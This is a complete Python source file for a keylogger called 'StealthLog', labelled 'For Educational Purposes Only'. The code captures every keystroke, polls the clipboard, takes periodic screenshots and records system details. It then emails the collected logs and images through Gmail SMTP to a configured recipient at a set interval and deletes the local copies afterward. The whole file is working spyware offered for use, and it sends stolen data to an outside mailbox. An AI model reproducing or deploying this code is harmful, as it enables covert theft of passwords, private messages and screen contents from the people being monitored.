# StealthLog: Advanced System Monitoring Tool
# For Educational Purposes Only.
# VERSION: Unencrypted

# --- Core Libraries ---
import socket
import platform
import os
import threading
from datetime import datetime

# --- Feature Libraries ---
from pynput.keyboard import Key, Listener
import win32clipboard
from PIL import ImageGrab

# --- Email Libraries ---
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# ==============================================================================
# --- CONFIGURATION ---
# ==============================================================================
# Set the interval for sending logs via email (in seconds)
# Example: 900 seconds = 15 minutes. For testing, set to 60.
SEND_INTERVAL = 900

# Set the interval for checking the clipboard (in seconds)
CLIPBOARD_INTERVAL = 15

# Set the interval for taking screenshots (in seconds)
SCREENSHOT_INTERVAL = 120 # 2 minutes

# --- Email Configuration ---
# IMPORTANT: Use a dedicated email account and a 16-digit App Password.
EMAIL_ADDRESS = "your_sender_email@gmail.com"
EMAIL_PASSWORD = "your_16_digit_app_password"
RECIPIENT_EMAIL = "your_recipient_email@gmail.com"

# --- File Paths ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "system_log.txt")
# ==============================================================================


class Keylogger:
    def __init__(self, send_interval, clipboard_interval, screenshot_interval):
        self.send_interval = send_interval
        self.clipboard_interval = clipboard_interval
        self.screenshot_interval = screenshot_interval
        self.listener_running = True
        self.current_clipboard = ""
        self.screenshots = []
        open(LOG_FILE, 'w').close() # Start with a clean log file

    def _write_to_log(self, data):
        """Appends data to the log file using UTF-8 encoding."""
        with open(LOG_FILE, "a", encoding='utf-8') as f:
            f.write(data)

    def _log_system_info(self):
        """Logs initial system information."""
        try:
            hostname = socket.gethostname()
            ip_addr = socket.gethostbyname(hostname)
            platform_info = platform.platform()
            info = (
                f"================ [System Information] ================\n"
                f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"PC Name: {hostname}\nPrivate IP: {ip_addr}\nOS: {platform_info}\n"
                f"====================================================\n\n"
            )
            self._write_to_log(info)
        except Exception:
            self._write_to_log("[ERROR] Could not gather system info.\n")

    def _on_press(self, key):
        """Callback for when a key is pressed."""
        timestamp = datetime.now().strftime('%H:%M:%S')
        try:
            log_entry = f"[{timestamp}] {key.char}\n"
        except AttributeError:
            key_name = str(key).replace("Key.", "")
            log_entry = f"[{timestamp}] [{key_name.upper()}]\n"
        self._write_to_log(log_entry)

    def _on_release(self, key):
        """Callback for when a key is released (used to stop the listener)."""
        if key == Key.esc:
            self.listener_running = False
            return False

    def _log_clipboard(self):
        """Periodically checks clipboard and reschedules itself."""
        if not self.listener_running: return
        try:
            win32clipboard.OpenClipboard()
            clipboard_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            if clipboard_data != self.current_clipboard:
                self.current_clipboard = clipboard_data
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                log_entry = (
                    f"\n================ [CLIPBOARD @ {timestamp}] ================\n"
                    f"{clipboard_data}\n"
                    f"============================================================\n\n"
                )
                self._write_to_log(log_entry)
        except (TypeError, win32clipboard.error): pass
        threading.Timer(self.clipboard_interval, self._log_clipboard).start()

    def _take_screenshot(self):
        """Takes a screenshot and reschedules itself."""
        if not self.listener_running: return
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filename = f"screenshot_{timestamp}.png"
        filepath = os.path.join(BASE_DIR, filename)
        try:
            ImageGrab.grab().save(filepath)
            self.screenshots.append(filepath)
            log_entry = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Screenshot taken: {filename}\n"
            self._write_to_log(log_entry)
        except Exception: pass
        threading.Timer(self.screenshot_interval, self._take_screenshot).start()

    def _send_logs_via_email(self):
        """Emails the report as a plain text file and reschedules itself."""
        if not self.listener_running: return
        
        print(f"\n[EMAIL TIMER] Checking if there are logs to send...")
        if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
            print(f"[EMAIL] Log file has data. Attempting to send email to {RECIPIENT_EMAIL}...")
            try:
                # 1. Set up the email message
                msg = MIMEMultipart()
                msg['From'] = EMAIL_ADDRESS
                msg['To'] = RECIPIENT_EMAIL
                msg['Subject'] = f"StealthLog Report (Unencrypted): {socket.gethostname()} ({datetime.now().strftime('%Y-%-m-%d')})"
                msg.attach(MIMEText("Log file and screenshots are attached.", 'plain'))
                
                # 2. Attach the log file directly as a .txt file
                with open(LOG_FILE, 'rb') as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', "attachment; filename=system_log.txt")
                msg.attach(part)

                # 3. Attach all screenshots
                for filepath in self.screenshots:
                    if os.path.exists(filepath):
                        with open(filepath, 'rb') as attachment:
                            part = MIMEBase('application', 'octet-stream')
                            part.set_payload(attachment.read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', f"attachment; filename={os.path.basename(filepath)}")
                        msg.attach(part)
                
                print("[EMAIL] Connecting to SMTP server...")
                # 4. Send the email
                server = smtplib.SMTP('smtp.gmail.com', 587)
                server.starttls()
                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, msg.as_string())
                server.quit()
                print("[EMAIL] SUCCESS! Email sent and connection closed.")

                # 5. Cleanup (this remains the same)
                open(LOG_FILE, 'w').close()
                for filepath in self.screenshots:
                    if os.path.exists(filepath): os.remove(filepath)
                self.screenshots.clear()

            except Exception as e:
                print(f"\n[EMAIL FAILED] An error occurred: {e}\n")

        else:
            print("[EMAIL] Log file is empty. Nothing to send.")

        # Reschedule this function to run again
        threading.Timer(self.send_interval, self._send_logs_via_email).start()

    def start(self):
        """Starts all logging components."""
        self._log_system_info()
        
        self._log_clipboard()
        self._take_screenshot()
        self._send_logs_via_email()
        
        print("[SYSTEM] Keylogger is running. Press 'Esc' to stop.")
        with Listener(on_press=self._on_press, on_release=self._on_release) as listener:
            listener.join()
        
        print("[SYSTEM] Keylogger has been stopped.")


if __name__ == "__main__":
    keylogger = Keylogger(
        send_interval=SEND_INTERVAL,
        clipboard_interval=CLIPBOARD_INTERVAL,
        screenshot_interval=SCREENSHOT_INTERVAL
    )
    keylogger.start()
